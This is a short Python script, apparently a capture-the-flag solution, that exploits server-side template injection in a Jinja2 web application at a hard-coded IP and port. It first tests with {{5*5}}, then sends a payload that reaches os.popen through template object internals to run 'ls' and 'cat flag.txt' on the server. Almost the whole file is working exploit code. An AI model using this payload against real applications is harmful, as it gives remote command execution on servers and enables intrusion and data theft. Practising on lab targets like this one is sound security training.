import requests as req

def run_SSTI(url, payload):

    print(f"URL: {payload}")
    print(f"PAYLOAD: {payload}")

    s = req.Session()
    res = s.get(f"{url}{payload}").text.split("<str>")[1].split("</str>")[0]

    print("RESULT")
    print("-"*30)
    print(res+"\n")


url = "http://46.101.23.188:30073/"

print("[»] Trying to run Server Side Template Injection...")
run_SSTI(url, "{{5*5}}")

print("[»] Injecting command 'ls'...")
payload = "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('ls').read()}}"
run_SSTI(url, payload)

print("[»] Injecting command 'cat flag.txt'...")
payload = "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat flag.txt').read()}}"
run_SSTI(url, payload)
